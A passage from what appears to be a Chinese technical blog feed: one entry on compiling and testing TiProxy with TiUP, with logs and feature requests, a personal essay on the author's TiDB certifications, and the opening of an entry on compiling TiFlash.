<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ make</span><br><span class="line">go build -gcflags <span class="string">&#x27;&#x27;</span> -ldflags <span class="string">&#x27; -X github.com/pingcap/TiProxy/pkg/util/versioninfo.TiProxyVersion=v0.1.1-ShawnYan -X github.com/pingcap/TiProxy/pkg/util/versioninfo.TiProxyGitHash=b944a8fe77a56bd39a7de3bf17d7deb1da039494&#x27;</span> -tags <span class="string">&#x27;&#x27;</span> -o ./bin/tiproxy ./cmd/tiproxy</span><br><span class="line">go build -gcflags <span class="string">&#x27;&#x27;</span> -ldflags <span class="string">&#x27; -X github.com/pingcap/TiProxy/pkg/util/versioninfo.TiProxyVersion=v0.1.1-ShawnYan -X github.com/pingcap/TiProxy/pkg/util/versioninfo.TiProxyGitHash=b944a8fe77a56bd39a7de3bf17d7deb1da039494&#x27;</span> -tags <span class="string">&#x27;&#x27;</span> -o ./bin/tiproxyctl ./cmd/tiproxyctl</span><br></pre></td></tr></table></figure></div>
<p>检查版本号：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./bin/tiproxy -v</span><br><span class="line">./bin/tiproxy version v0.1.1-ShawnYan, commit 81f4897fcf859154255adc86f875eda3f7e5c8a0</span><br><span class="line">$ ./bin/tiproxyctl -v</span><br><span class="line">./bin/tiproxyctl version <span class="built_in">test</span>, commit <span class="built_in">test</span> commit</span><br></pre></td></tr></table></figure></div>
<p>这里遇到第一个问题，<code>tiproxyctl</code> 不识别 <code>VERSION</code> 变量，原因是在代码中出现硬编码。(<a class="link"   href="https://github.com/pingcap/TiProxy/issues/340" >[Closed] Hard code in tiproxyctl #340 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<p>修改后，版本号获取正常。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./bin/tiproxy -v</span><br><span class="line">./bin/tiproxy version v0.1.1-ShawnYan, commit b944a8fe77a56bd39a7de3bf17d7deb1da039494-dirty</span><br><span class="line">$ ./bin/tiproxyctl -v</span><br><span class="line">./bin/tiproxyctl version v0.1.1-ShawnYan, commit b944a8fe77a56bd39a7de3bf17d7deb1da039494-dirty</span><br></pre></td></tr></table></figure></div>
<h2 id="TiProxy-尝鲜">TiProxy 尝鲜</h2>
<p>TiProxy 的日志格式支持 TiDB 原生格式、<code>json</code> 格式和 <code>console</code> 格式。<br>
下面启动 TiProxy 服务，日志采用 <code>json</code> 格式和 <code>DEBUG</code> 级别。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/tiproxy --config ./conf/proxy.toml --log_encoder console --log_level debug</span><br></pre></td></tr></table></figure></div>
<p>tiproxy 启动后尝试连接：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mysql --comments --host 127.0.0.1 --port 6000 -u root</span><br></pre></td></tr></table></figure></div>
<p>值得注意的是，TiDB 服务端与客户端之间默认采用非加密连接 <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，TiDB 启动时默认也不会生成 TLS 证书 <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，但是 tiproxy 启动时默认启用 tls 认证，这里为了简化测试，选择修改默认配置项，不要求配置 tls。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi conf/proxy.toml</span><br><span class="line"></span><br><span class="line">[proxy]</span><br><span class="line">require-backend-tls = false</span><br></pre></td></tr></table></figure></div>
<p>否则会连接失败，遇到报错：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysql --comments --host 127.0.0.1 --port 6000 -u root</span><br><span class="line">ERROR 1105 (HY000): Unknown error%!(EXTRA string=TiProxy fails to connect to TiDB, please check network)</span><br></pre></td></tr></table></figure></div>
<p>以及控制台打印日志：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023/08/23 12:00:27.645 +09:00  INFO    main.proxy      proxy/proxy.go:159      new connection  &#123;&quot;connID&quot;: 0, &quot;client_addr&quot;: &quot;127.0.0.1:42944&quot;&#125;</span><br><span class="line">2023/08/23 12:00:27.645 +09:00  DEBUG   main.proxy.conn.be.authenticator        backend/authenticator.go:135    frontend send capabilities unsupported by proxy &#123;&quot;connID&quot;: 0, &quot;client_addr&quot;: &quot;127.0.0.1:42944&quot;, &quot;common&quot;: &quot;CLIENT_LONG_PASSWORD|CLIENT_LONG_FLAG|CLIENT_LOCAL_FILES|CLIENT_PROTOCOL_41|CLIENT_INTERACTIVE|CLIENT_TRANSACTIONS|CLIENT_SECURE_CONNECTION|CLIENT_MULTI_STATEMENTS|CLIENT_MULTI_RESULTS|CLIENT_PLUGIN_AUTH|CLIENT_CONNECT_ATTS|CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA|CLIENT_DEPRECATE_EOF&quot;, &quot;frontend&quot;: &quot;CLIENT_PS_MULTI_RESULTS|CLIENT_CAN_HANDLE_EXPIRED_PASSWORDS|CLIENT_SESSION_TRACK|CLIENT_QUERY_ATTRIBUTES|MULTI_FACTOR_AUTHENTICATION&quot;, &quot;proxy&quot;: &quot;CLIENT_FOUND_ROWS|CLIENT_CONNECT_WITH_DB|CLIENT_ODBC|CLIENT_RESERVED&quot;&#125;</span><br><span class="line">2023/08/23 12:00:27.646 +09:00  INFO    main.proxy.conn.be      backend/backend_conn_mgr.go:218 connected to backend    &#123;&quot;connID&quot;: 0, &quot;client_addr&quot;: &quot;127.0.0.1:42944&quot;, &quot;ns&quot;: &quot;default&quot;, &quot;backend_addr&quot;: &quot;127.0.0.1:4000&quot;&#125;</span><br><span class="line">2023/08/23 12:00:27.646 +09:00  DEBUG   main.proxy.conn.be.authenticator        backend/authenticator.go:200    backend does not support capabilities from proxy        &#123;&quot;connID&quot;: 0, &quot;client_addr&quot;: &quot;127.0.0.1:42944&quot;, &quot;common&quot;: &quot;CLIENT_LONG_PASSWORD|CLIENT_FOUND_ROWS|CLIENT_LONG_FLAG|CLIENT_CONNECT_WITH_DB|CLIENT_LOCAL_FILES|CLIENT_PROTOCOL_41|CLIENT_INTERACTIVE|CLIENT_TRANSACTIONS|CLIENT_SECURE_CONNECTION|CLIENT_MULTI_STATEMENTS|CLIENT_MULTI_RESULTS|CLIENT_PLUGIN_AUTH|CLIENT_CONNECT_ATTS|CLIENT_DEPRECATE_EOF&quot;, &quot;proxy&quot;: &quot;CLIENT_ODBC|CLIENT_RESERVED|CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA&quot;, &quot;backend&quot;: &quot;CLIENT_SSL&quot;&#125;</span><br><span class="line">2023/08/23 12:00:27.646 +09:00  INFO    main.proxy.conn client/client_conn.go:61        new connection failed   &#123;&quot;connID&quot;: 0, &quot;client_addr&quot;: &quot;127.0.0.1:42944&quot;, &quot;proxy-protocol&quot;: false, &quot;backend_addr&quot;: &quot;127.0.0.1:4000&quot;, &quot;quit source&quot;: &quot;proxy error&quot;, &quot;error&quot;: &quot;require TLS config on TiProxy when require-backend-tls=true&quot;&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="使用-TiUP-启动-TiProxy">使用 TiUP 启动 TiProxy</h2>
<p>TiUP 下个版本应该就会包含这个功能，感谢 @xhebox 大佬的贡献，得以让我们使用 tiup 来调用 tiproxy 组件，这里先抢先体验一下如何使用 tiup playground 启动 tidb 和 tiproxy，当然 tiup cluster 也是支持的。</p>
<p>由于含有该功能代码的 tiup 还没发布，所以需要自行编译 tiup，编译步骤可参考 <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tiup/">《TiDB 源码编译之 TiUP 篇》</a> 。</p>
<p>编译后的 tiup 版本信息如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ tiup --version</span><br><span class="line">1.12.5 tiup</span><br><span class="line">Go Version: go1.21.0</span><br><span class="line">Git Ref: master</span><br><span class="line">GitHash: a9580bd</span><br></pre></td></tr></table></figure></div>
<p>tiproxy 组件尚未发布到官方的镜像库，所以要想使用 tiup 调度 tiproxy 组件，需要先将 tiproxy 包上传至当前使用的 tiup 镜像库，这里使用的是本地镜像库，使用如下命令进行上传：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">tiup mirror publish tiproxy v0.1.1 ./tiproxy.tar.gz tiproxy --desc tiproxy</span><br><span class="line">tiup mirror publish tiproxy nightly ./tiproxy.tar.gz tiproxy --desc tiproxy</span><br></pre></td></tr></table></figure></div>
<p>具体操作步骤可参考 <a href="https://shawnyan.cn/2022/tidb/tiup-intro/#tiup-mirror">《TiUP：TiDBAer 必备利器》</a> ，提示，需要同时提交 <code>nightly</code> 版本，否则会提示错误信息。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: Playground bootstrapping failed: component tiproxy doesn&#x27;t have nightly version on platform linux/amd64</span><br></pre></td></tr></table></figure></div>
<p>上述步骤完成后，可以看到 <code>tiup-playground</code> 已经增加了 tiproxy 相关选项。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./tiup-playground --version</span><br><span class="line">tiup version 1.12.5 tiup</span><br><span class="line">Go Version: go1.21.0</span><br><span class="line">Git Ref: master</span><br><span class="line">GitHash: a9580bd</span><br><span class="line"></span><br><span class="line">$ ./tiup-playground --<span class="built_in">help</span> | grep tiproxy</span><br><span class="line">--tiproxy int                      TiProxy instance number</span><br><span class="line">--tiproxy.binpath string           TiProxy instance binary path</span><br><span class="line">--tiproxy.config string            TiProxy instance configuration file</span><br><span class="line">--tiproxy.host host                Playground TiProxy host. If not provided, TiProxy will still use host flag as its host</span><br><span class="line">--tiproxy.port int                 Playground TiProxy port. If not provided, TiProxy will use 6000 as its port</span><br><span class="line">--tiproxy.timeout int              TiProxy max <span class="built_in">wait</span> time <span class="keyword">in</span> seconds <span class="keyword">for</span> starting, 0 means no <span class="built_in">limit</span> (default 60)</span><br></pre></td></tr></table></figure></div>
<p>启动演示如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">tiup playground 7.0 --tag 7.0 --without-monitor --tiflash 0 --tiproxy 1</span><br></pre></td></tr></table></figure></div>
<img  alt="t3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/03-1692809632567.png"
                      referrerpolicy="no-referrer"
                >
<p>通过端口 6000 连接 tiproxy：</p>
<img  alt="t4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/04-1692809640622.png"
                      referrerpolicy="no-referrer"
                >
<p>到此，tiproxy 已经启动成功，并成功通过 tiproxy 连接到后端 tidb 集群。由于篇幅有限，tiproxy 的功能演示、测试内容另行成文。</p>
<h2 id="期许">期许</h2>
<h3 id="1-源码-repo-命名小写">1. 源码 repo 命名小写</h3>
<p>目前的 repo 名为 [pingcap/TiProxy]，建议改为小写 <code>pingcap/tiproxy</code>，统一命名方式。<br>
毕竟是 <code>pingcap/tidb</code> 而非 [pingcap/TiDB]，是 <code>tikv/tikv</code> 而非 [tikv/TiKV]，是 <code>tikv/pd</code> 而非 [tikv/PD]。</p>
<h3 id="2-tiproxy-端口非-4000">2. tiproxy 端口非 4000</h3>
<p>我相信大家已经达成共识，端口 4000 就是 TiDB Server 的默认端口，所以真的不建议在 tiproxy 和 tidb server 同时启动时，将 tidb server 的端口改成其他端口，而将 tiproxy 的端口改成 4000。AskTUG 论坛中有相关贴子：<a class="link"   href="https://asktug.com/t/topic/1011374" >闲聊贴 | 数据库端口的问题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="3-tiproxy-可以独立启动">3. tiproxy 可以独立启动</h3>
<p>对 TiDB 深入了解的同学都知道，TiDB 的三大核心组件 TiDB Server / TiKV / PD 都可以独立启动。希望 TiProxy 也可以做到这点，不依赖 PD 也可以独立启动，而不是找不到 PD 就原地“躺平”，无时间限制不断重试连接 PD。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2023/08/22 11:47:46.122 +09:00] [WARN] [main.infosync.etcdcli] [v3@v3.5.6/retry_interceptor.go:62] [retrying of unary invoker failed]  [target=etcd-endpoints://0xc000802380/127.0.0.1:2379] [attempt=0] [error=&quot;rpc error: code = DeadlineExceeded desc = latest balancer error: last connection error: connection error: desc = \&quot;transport: Error while dialing dial tcp 127.0.0.1:2379: connect: connection refused\&quot;&quot;]</span><br><span class="line">[2023/08/22 11:47:46.122 +09:00] [INFO] [main.infosync.etcdcli] [v3@v3.5.6/client.go:210] [Auto sync endpoints failed.]  [error=&quot;context deadline exceeded&quot;]</span><br></pre></td></tr></table></figure></div>
<p>tiproxy 连接 pd 异常时，通过客户端连接 6000 端口会报错：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysql -uroot -hlocalhost -P6000</span><br><span class="line">ERROR 1105 (HY000): Unknown error%!(EXTRA string=No available TiDB instances, please check TiDB cluster)</span><br></pre></td></tr></table></figure></div>
<h3 id="4-包版本升级">4. 包版本升级</h3>
<p>建议升级包的版本，比如 【 <a class="link"   href="https://github.com/pingcap/TiProxy/blob/main/go.mod#L3" >go 1.19 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 】 升级到 【 go 1.21 】，跟核心组件对齐，参考帖子：</p>
<ul>
<li><a class="link"   href="https://internals.tidb.io/t/topic/870" >Announcing upgrade to Go 1.21 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>还有其他包，比如：</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line">github.com/<span class="keyword">go</span>-mysql-org/<span class="keyword">go</span>-mysql v1<span class="number">.6</span><span class="number">.0</span></span><br><span class="line">github.com/pingcap/tidb v1<span class="number">.1</span><span class="number">.0</span>-beta<span class="number">.0</span><span class="number">.20230103132820</span><span class="number">-3</span>ccff46aa3bc</span><br><span class="line">github.com/pingcap/tidb/parser v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20230103132820</span><span class="number">-3</span>ccff46aa3bc</span><br></pre></td></tr></table></figure></div>
<p>相关 Issue：<a class="link"   href="https://github.com/pingcap/tiup/issues/2237" >[Closed] Upgrade go-sql-driver/mysql version to v1.7.1 #2237 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="5-监控面板">5. 监控面板</h3>
<p>TiProxy 已经提供了一些 API 来对其进行管理，但还是期望可以有一个极简的 Web 页面来达到可视化的目的。<br>
毕竟 HAProxy 有 <code>http://localhost:9999/haproxy-status</code> ， ProxySQL 也有 <code>http://localhost:6080</code>。<br>
甚至，TiDB Lightning 都有 <code>http://localhost:8289</code>，参见文档：<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-lightning-web-interface" >TiDB Lightning Web 界面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h3 id="6-操作系统支持">6. 操作系统支持</h3>
<p>由于 tiproxy 尚未上载到 tiup mirror，所以想要测试 tiproxy 只能从 <a class="link"   href="https://github.com/pingcap/TiProxy/releases/tag/v0.1.1" >github repo asset <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 下载，或者自行编译。测试 github 上的包时发现，在 CentOS 7 上无法运行，相关讨论帖参见：<a class="link"   href="https://asktug.com/t/topic/1011831" >tiproxy 无法使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。<br>
这只是一个点，tiproxy 兼容性测试也要加油啊。</p>
<img  alt="t5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230824-9d740091-c582-470a-88a1-6cc4d25158c3-1692927139282.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="7-编译参数">7. 编译参数</h3>
<p>建议加上 <code>make clean</code> 选项，或者 make file 可以再完善一下，如果能做到像 tiup 那样一个 <code>make</code> 命令搞定就很棒了。(<a class="link"   href="https://github.com/pingcap/TiProxy/issues/343" >[Closed] support make clean option #343 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<p>另外，希望将环境变量 <code>GO111MODULE=&quot;on&quot;</code> 也写进 makefile。</p>
<h3 id="8-错误日志">8. 错误日志</h3>
<p>error code 建议细化一下，不然使用者真的容易 <code>UNKNOWN</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ERROR 1105 (HY000): Unknown error%!(EXTRA string=TiProxy fails to connect to TiDB, please check network)</span><br></pre></td></tr></table></figure></div>
<p>有些日志的告警级别希望调整一下，比如查询错误现在是 <code>DEBUG</code>，可以改为 <code>WARN</code>，或者单独输出到一个日志文件。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023/08/22 23:51:33.138 +08:00    DEBUG    main.proxy.conn.be    backend/backend_conn_mgr.go:283    got a mysql error    &#123;&quot;connID&quot;: 0, &quot;client_addr&quot;: &quot;127.0.0.1:41942&quot;, &quot;ns&quot;: &quot;default&quot;, &quot;error&quot;: &quot;ERROR 1105 (HY000): conflict hypo index name hypo_a&quot;, &quot;cmd&quot;: &quot;Query&quot;&#125;</span><br><span class="line"></span><br><span class="line">2023/08/22 23:59:08.745 +08:00    DEBUG    main.proxy.conn.be    backend/backend_conn_mgr.go:283    got a mysql error    &#123;&quot;connID&quot;: 0, &quot;client_addr&quot;: &quot;127.0.0.1:41942&quot;, &quot;ns&quot;: &quot;default&quot;, &quot;error&quot;: &quot;ERROR 8108 (HY000): Unsupported type *ast.DropProcedureStmt&quot;, &quot;cmd&quot;: &quot;Query&quot;&#125;</span><br></pre></td></tr></table></figure></div>
<p>此外，开启 DEBUG 日志后，有大量的 <code>main.infosync.etcdcli</code> 日志输出，每 3s 打印一次，建议优化掉。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2023/08/22 23:59:02.799 +08:00    DEBUG    main.infosync.etcdcli    v3@v3.5.6/retry_interceptor.go:53    retrying of unary invoker  &#123;<span class="string">&quot;target&quot;</span>: <span class="string">&quot;etcd-endpoints://0xc000980000/127.0.0.1:2379&quot;</span>, <span class="string">&quot;attempt&quot;</span>: 0&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>据说 TiProxy 的云化版本已经用在了 TiDB Cloud 中，期待 TiProxy 早日 GA，并且最终可以到达能够替换 HAProxy 或 ProxySQL 的水准。</p>
<p>附：</p>
<img  alt="t6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/05-1692809648847.png"
                      referrerpolicy="no-referrer"
                >
<p>End.</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/enable-tls-between-clients-and-servers" >https://docs.pingcap.com/zh/tidb/stable/enable-tls-between-clients-and-servers <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file#auto-tls" >https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file#auto-tls <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 7.x</category>
      </categories>
      <tags>
        <tag>proxysql</tag>
        <tag>tidb</tag>
        <tag>compile</tag>
        <tag>tidb 7.x</tag>
        <tag>tiproxy</tag>
      </tags>
  </entry>
  <entry>
    <title>我和 TiDB 的故事 | 远近高低各不同</title>
    <url>/2023/tidb/my-story-with-tidb-2023/</url>
    <content><![CDATA[<h2 id="Hi-TiDB-Again">Hi, TiDB, Again!</h2>
<p>书接上回，<a href="https://shawnyan.cn/2022/tidb/my-story-with-tidb-2022/">《我和 TiDB 的故事 | 横看成岭侧成峰》</a>，一年时光如白驹过隙，这一年我好似在 TiDB 上投入的时间总量不是很多，但是断断续续也一直有在关注使用。当然，数据是造不了假的，看热力图就知道我一直都在，只是每逢周末就忘记登录，所以直到现在也还没达到连续签到 100 天的小目标。</p>
<img  alt="t1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230815-7edefd90-970f-4ea8-b15c-0c5830ee6e93-1692114602772.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="TiExplorer">TiExplorer</h2>
<p>AskTUG 论坛里可以在个人页面 (<code>https://asktug.com/u/&lt;个人昵称&gt;/preferences/account</code>) 修改头衔，我的头衔设定的是【<strong>TiExplorer</strong>】。TiExplorer 是 TiDB<br>
探索者的意思，不是 TiDB 浏览器。</p>
<p>TiExplorer 缘起于去年 PE 的 【 TiDB 性能调优案例学习 [TiDB v5.x] (304) 】和【 TiDB 故障排除案例学习 [TiDB v5.x] (305) 】 课程内测活动，当时有若干位 Ti-Juaner 在一周内“卷完了” 304 和 305 两门课程的内容，号称“<strong>卷王中王</strong>”，我也是其中一位，于是获得了 TiExplorer 勋章，自此之后便以此作为我在论坛的 Title。</p>
<img  alt="t2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230815-ea7a3967-f878-4a07-b2d9-3a2c0c3e3ad5-1692114621318.png"
                      width="350" referrerpolicy="no-referrer"
                >
<p>上回我也提及过有在很认真的卷 PE 课程和认证考试，过去的一年里，PE 中文站推出了 PCTP V6 版认证及相关课程，和面向应用开发者的 PCSD (PingCAP Certified SQL Developer) 认证及相关课程。这里力推 Todd 神灯老师主讲的 201 系列课程，及其在 GitHub 上开源的课件，值得每一位开发者学习。</p>
<p>BTW，这个 Repo (<a href="https://github.com/pingcap/tidb-course-201-lab"><code>pingcap/tidb-course-201-lab</code></a>) 是活跃仓，一直有在更新维护，从下图还可以“窥探”到 Todd 神灯老师更习惯在周三、周四晚上 Push 代码，有时凌晨也有代码提交记录。</p>
<img  alt="t3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230815-564badd4-105c-4e48-9cc5-0fb01c379a06-1692114635734.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="PE">PE</h2>
<p>TiDB v6.0.0 刚出不久，PE 就推出了 PCTA 和 PCTP 的 V6 版本，装配 “V6” 果然动力强劲，非同凡响，相较于友商 4.x 都发布一年了，认证才计划于近日从 v2 升级 v3。<br>
不过，过去的一年，PE 中文站的更新速度有所放缓。可能好多同学还不知道，P社贵司已在全球拥有 9 个 OFFICE，官方主页也支持中文、英文、日文三种语言。相应的，PE 推出了全新的英文站和日文站，发布了英文、日文培训和认证，以及入门级的 PingCAP 认证 【PingCAP Certified TiDB Practitioner】。</p>
<ul>
<li>PingCAP University：<a class="link"   href="https://www.pingcap.com/education/" >https://www.pingcap.com/education/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>PingCAP Education オンライントレーニング: <a class="link"   href="https://pingcap.co.jp/education/" >https://pingcap.co.jp/education/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>到此，PingCAP Education 已经推出四门 TiDB 认证。</p>
<img  alt="t4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230815-e1d0c728-bd25-44f5-a015-e157f743199c-1692114643607.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="Certified">Certified</h2>
<p>TiDB 是具有信创资质的国产数据库，在数据安全性、合规性和 <a class="link"   href="https://asktug.com/t/topic/1011022" >产品兼容性 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上均有发力。面对“琳琅满目”的国产数据库如何选择，组织有组织的选择标准，对于 DBA 而言，选择性有限且难以选择。先不说其他国产数据库，TiDB 曾在国产数据库排行榜上连续榜首多月，单就这条理由就值得国产数据库 DBA 来学习、研究，这里不仅有前沿的技术、理论，还拥抱开源、乐于分享，更有开放且活跃的社区。而通过数据库厂商举办的极客大赛、学习项目，或是参加相关培训、认证考试，则是一个正确且快捷的学习路径。</p>
<p>关于数据库认证的话题，下面引用一段前几日我在墨天轮上的分享 – <a href="https://shawnyan.cn/2023/modb/modb-how-to-be-a-good-dba/">如何成为一名国产数据库 DBA?</a> 。</p>
<blockquote>
<p>2019年下半年，他的关注度从 DB-Engine 开始转向国产数据库排行榜，从而开始了国产数据库的学习之旅，这次“旅程”的体验感完全不同，因为排行榜上有 200+ 产品可以选择，如何找到一个好的切入点来开启这段旅程，他的选择很简单，从榜首开始研究。巧合的是，当时国产数据库位列榜单第一的是 PingCAP 的 TiDB，而他们团队在此之前已经开始接触研究 TiDB，当时还是 v2 版本。他个人习惯的学习路径基本是先找官方文档，快速浏览全部的文档，或者直接购买相关书籍（或者前往墨天轮墨值商城兑换）。因为图书是经过严格审校才会出版的，至少可以保证内容的正确性，如此，就对该产品有个大体的印象，初步搭建“记忆宫殿”。</p>
<p>其次，直接上手体验数据库，遇到问题再查文档、使用搜索引擎、使用墨天轮的搜索、去论坛提问、翻源码等等，循环往复，便对一款新数据库有全新的认识。值得一提的是，有些数据库厂商已经投入部分精力到培训认证方面，这里以 TiDB 为例，他们创建了 PingCAP Education（简称PE），并发布了一系列课程，从体系介绍到性能优化，从入门实践到故障分析，对 TiDB 感兴趣或是需要进阶技能的同学都可以在 PE 网站上系统学习，PE提供的课程以视频教学为主、辅助以实验和习题，并可通过认证考试来检验学习成果。在过去的两年里，严少安也已经成功拿到了 PE 认证全家桶。</p>
</blockquote>
<img  alt="t5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230815-e3694d7a-3c2c-43eb-8064-d969e7226497-1692114650829.png"
                      referrerpolicy="no-referrer"
                >
<p>这里，<s>还是希望将 TiDB 入门级认证引入 PE 中文站</s>，让更多人（不只是 DBA 或开发者）来了解 TiDB，了解这个业界领先的企业级开源分布式数据库。</p>
<blockquote>
<p>2023-09-17, <strong>TiDB 从业者认证</strong> 已推出中文版，快来卷呀~ <a class="link"   href="https://mp.weixin.qq.com/s?__biz=Mzg3NTU3NTMxNg==&amp;mid=2247488368&amp;idx=1&amp;sn=072b874dd47f635e54df3fb4e27c0dfd" >即刻预约｜零技术基础、0 元考取 TiDB 从业者认证！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>补充一点，据说，那些 OCM 大师们都喜欢晒“战袍”，我也浅晒一张我的 PingCAP Certified T-shirt。</p>
<img  alt="t6.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230815-797281bc-1e17-4092-90e7-7e08db638de8-1692114656743.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="To-Be-Continued">To Be Continued</h2>
<p>所有一切的美好，都会如约而至。愿在 AskTUG 的每一天都是阳光、激情、如初恋般美好的。</p>
<img  alt="t7.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230815-b44c4331-235d-4e52-a36d-ef5959d24bf4-1692114663513.png"
                      referrerpolicy="no-referrer"
                >
<hr>
<p>特别鸣谢：@YY 友情设计的 banner.</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>TiDB</category>
        <category>Book</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>pingcap</tag>
        <tag>TiExplorer</tag>
        <tag>story</tag>
        <tag>education</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 7.x 源码编译之 TiFlash 篇</title>
    <url>/2023/tidb/tidb-7.x-compile-tiflash/</url>
    <content><![CDATA[<img  alt="tidb-7.x-new-feature-banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/tidb-7.x-new-feature-banner-1696249336706.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="导言">导言</h2>
